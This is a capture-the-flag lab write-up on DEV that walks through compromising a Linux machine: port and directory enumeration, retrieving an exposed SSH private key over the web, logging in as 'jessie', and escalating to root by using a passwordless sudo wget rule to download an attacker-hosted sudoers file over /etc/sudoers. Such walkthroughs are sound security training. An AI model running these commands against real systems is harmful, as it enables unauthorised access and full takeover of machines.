# Wget CTF: From Port Enumeration and Secret Keys to Root Privileges via Wget GTFOBins

<p>Hello, tech enthusiasts and cybersecurity hobbyists! In this write-up, we will walk step-by-step through how we successfully penetrated and seized full control of a Linux system in a <strong>Wget CTF</strong> lab environment, starting from network reconnaissance all the way to gaining ultimate Root privileges.</p>




<h2>
  
  
  1. Reconnaissance &amp; Enumeration
</h2>

<p>We began our journey as usual by scanning the target using <strong>Nmap</strong> to discover open ports and running services:<br />
</p>

<div class="highlight js-code-highlight">
<pre class="highlight shell"><code>nmap <span class="nt">-sV</span> <span class="nt">-sC</span> &lt;Target-IP&gt;

</code></pre>

</div>



<p>The scan revealed two main ports:</p>

<ul>
<li>
<strong>Port 22 (SSH):</strong> Secure shell service.</li>
<li>
<strong>Port 80 (HTTP):</strong> Web server (Apache).</li>
</ul>

<p><a class="article-body-image-wrapper" href="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2F1kn48oerq1e1yd5i8gsx.png"><img alt=" " height="307" src="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2F1kn48oerq1e1yd5i8gsx.png" width="800" /></a></p>

<p>Next, we performed web content fuzzing using <strong>ffuf</strong> with a standard wordlist:<br />
</p>

<div class="highlight js-code-highlight">
<pre class="highlight shell"><code>ffuf <span class="nt">-u</span> http://&lt;Target-IP&gt;/FUZZ <span class="nt">-w</span> /usr/share/seclists/Discovery/Web-Content/common.txt

</code></pre>

</div>



<p>This scan led us to discover a key directory named <code>sitemap</code>.</p>

<p><a class="article-body-image-wrapper" href="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Fnnhybg681qz9zlhg9udu.png"><img alt=" " height="414" src="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Fnnhybg681qz9zlhg9udu.png" width="800" /></a></p>

<p>We ran additional fuzzing inside the <code>sitemap</code> directory:<br />
</p>

<div class="highlight js-code-highlight">
<pre class="highlight shell"><code>ffuf <span class="nt">-u</span> http://&lt;Target-IP&gt;/sitemap/FUZZ <span class="nt">-w</span> /usr/share/seclists/Discovery/Web-Content/common.txt

</code></pre>

</div>



<p>This revealed a hidden <code>.ssh</code> folder.</p>

<p><a class="article-body-image-wrapper" href="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Fxic6kkzse8usjvzscxhu.png"><img alt=" " height="493" src="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Fxic6kkzse8usjvzscxhu.png" width="800" /></a></p>

<p>By browsing to the main website and inspecting the page source, we found a very important developer comment hinting at the target username:</p>

<blockquote>
<p><code>Jessie don't forget to update the website</code></p>
</blockquote>

<p><a class="article-body-image-wrapper" href="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2F0xmhfa8j1zesnh548j8t.png"><img alt=" " height="347" src="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2F0xmhfa8j1zesnh548j8t.png" width="799" /></a></p>

<p><a class="article-body-image-wrapper" href="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Ft3xpogflsdlsx37hjevn.png"><img alt=" " height="348" src="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Ft3xpogflsdlsx37hjevn.png" width="800" /></a></p>

<p>By navigating through the paths and accessing the <code>.ssh</code> directory via the browser, we located the user's private SSH key (<code>id_rsa</code>).</p>

<p><a class="article-body-image-wrapper" href="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Fuf6k64gbxiulh58xdi96.png"><img alt=" " height="350" src="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Fuf6k64gbxiulh58xdi96.png" width="800" /></a></p>

<p>We displayed the full content of the private key directly from the browser view.</p>

<p><a class="article-body-image-wrapper" href="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Fz4jf847j5by2656t31bg.png"><img alt=" " height="349" src="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Fz4jf847j5by2656t31bg.png" width="800" /></a></p>




<h2>
  
  
  2. Setting Up the Key &amp; Initial Access
</h2>

<p>On our attacking machine, we created a new file and saved the private key content:<br />
</p>

<div class="highlight js-code-highlight">
<pre class="highlight shell"><code>nano id_rsa

</code></pre>

</div>



<p><a class="article-body-image-wrapper" href="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Fflwkai8du5sbsr6b8mc4.png"><img alt=" " height="56" src="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Fflwkai8du5sbsr6b8mc4.png" width="381" /></a></p>

<p><a class="article-body-image-wrapper" href="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2F1mq0i5lzwwxyyusx258y.png"><img alt=" " height="334" src="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2F1mq0i5lzwwxyyusx258y.png" width="800" /></a></p>

<p>Because the SSH client rejects private keys with overly permissive permissions, we adjusted the file permissions so that only the owner can read it:<br />
</p>

<div class="highlight js-code-highlight">
<pre class="highlight shell"><code><span class="nb">sudo chmod </span>600 id_rsa

</code></pre>

</div>



<p><a class="article-body-image-wrapper" href="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Fef0zykh4isa45v9re286.png"><img alt=" " height="76" src="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Fef0zykh4isa45v9re286.png" width="336" /></a></p>

<p>After securing the permissions, we logged into the target system as the user <code>jessie</code> using the private key:<br />
</p>

<div class="highlight js-code-highlight">
<pre class="highlight shell"><code><span class="nb">sudo </span>ssh <span class="nt">-i</span> id_rsa jessie@&lt;Target-IP&gt;

</code></pre>

</div>



<p>And we successfully gained shell access!</p>

<p><a class="article-body-image-wrapper" href="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Fj607e6k3o6ac24liubqa.png"><img alt=" " height="400" src="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Fj607e6k3o6ac24liubqa.png" width="776" /></a></p>

<p>Once inside, we explored the user's directories and navigated to the Documents folder to retrieve our first flag:</p>

<ul>
<li>
<strong>Flag Location:</strong> <code>~/Documents/user_flag.txt</code>
</li>
<li>
<strong>Flag Value:</strong> <code>.............................</code>
</li>
</ul>

<p><a class="article-body-image-wrapper" href="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Fodf1ti5yotgfxe8gl4ho.png"><img alt=" " height="165" src="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Fodf1ti5yotgfxe8gl4ho.png" width="437" /></a></p>




<h2>
  
  
  3. Privilege Escalation to Root
</h2>

<p>To check the permissions granted to our current user and identify escalation vectors, we executed:<br />
</p>

<div class="highlight js-code-highlight">
<pre class="highlight shell"><code><span class="nb">sudo</span> <span class="nt">-l</span>

</code></pre>

</div>



<p>The results showed that user <code>jessie</code> is allowed to run the <code>wget</code> binary as root without a password:</p>

<blockquote>
<p><code>(root) NOPASSWD: /usr/bin/wget</code></p>
</blockquote>

<p><a class="article-body-image-wrapper" href="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Fi1tdzo1s56zwoobaufda.png"><img alt=" " height="94" src="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Fi1tdzo1s56zwoobaufda.png" width="797" /></a></p>

<p>Leveraging this misconfiguration (via GTFOBins), we created a local <code>sudoers</code> file on our attacker machine granting user <code>jessie</code> full administrative privileges without a password:<br />
</p>

<div class="highlight js-code-highlight">
<pre class="highlight shell"><code><span class="nb">echo</span> <span class="s2">"jessie ALL=(ALL:ALL) NOPASSWD: ALL"</span> <span class="o">&gt;</span> sudoers

</code></pre>

</div>



<p><a class="article-body-image-wrapper" href="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Fl8is1d10u6ahugit203g.png"><img alt=" " height="57" src="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Fl8is1d10u6ahugit203g.png" width="483" /></a></p>

<p>Next, we hosted this file locally using a temporary Python HTTP server:<br />
</p>

<div class="highlight js-code-highlight">
<pre class="highlight shell"><code>python3 <span class="nt">-m</span> http.server <span class="nt">-b</span> &lt;Kali-IP&gt; 80

</code></pre>

</div>



<p><a class="article-body-image-wrapper" href="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Fxzo64wbhxcclr4gpyf7j.png"><img alt=" " height="61" src="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Fxzo64wbhxcclr4gpyf7j.png" width="603" /></a></p>

<p>On the victim machine, we pulled the modified file and overwrote the system's core <code>/etc/sudoers</code> file using the permitted <code>wget</code> command as root:<br />
</p>

<div class="highlight js-code-highlight">
<pre class="highlight shell"><code><span class="nb">sudo</span> /usr/bin/wget http://&lt;Kali-IP&gt;/sudoers <span class="nt">-O</span> /etc/sudoers

</code></pre>

</div>



<p><a class="article-body-image-wrapper" href="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Fyc7reffi4in48wfd4gn9.png"><img alt=" " height="78" src="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Fyc7reffi4in48wfd4gn9.png" width="800" /></a></p>




<h2>
  
  
  4. Full Control &amp; Capturing the Root Flag
</h2>

<p>Once the overwrite operation completed successfully, we were able to elevate to the root user immediately and without restrictions:<br />
</p>

<div class="highlight js-code-highlight">
<pre class="highlight shell"><code><span class="nb">sudo </span>su

</code></pre>

</div>



<p>And the shell prompt instantly transformed into <code>root@CorpOne</code>!</p>

<p><a class="article-body-image-wrapper" href="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Fq1fl1ikpbpbco635q5bc.png"><img alt=" " height="48" src="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Fq1fl1ikpbpbco635q5bc.png" width="410" /></a></p>

<p>Finally, we navigated to the root user's home directory (<code>/root</code>) and read the final flag:</p>

<ul>
<li>
<strong>Flag Location:</strong> <code>/root/root_flag.txt</code>
</li>
<li>
<strong>Flag Value:</strong> <code>..................................</code>
</li>
</ul>

<p><a class="article-body-image-wrapper" href="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Fd0xmn5qf48m5gxzq98i8.png"><img alt=" " height="106" src="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Fd0xmn5qf48m5gxzq98i8.png" width="315" /></a></p>




<h2>
  
  
  Conclusion
</h2>

<p>This concludes our successful walkthrough of the <strong>Wget CTF</strong> challenge, covering everything from initial reconnaissance and extracting SSH keys to exploiting <code>sudo</code> privileges via <code>wget</code> for absolute root access.</p>

<p>I hope you enjoyed this write-up. Happy hacking, and see you in future technical articles!</p>

[Read original article on DEV](https://dev.to/mohammadali_30/wget-ctf-from-port-enumeration-and-secret-keys-to-root-privileges-via-wget-gtfobins-j0)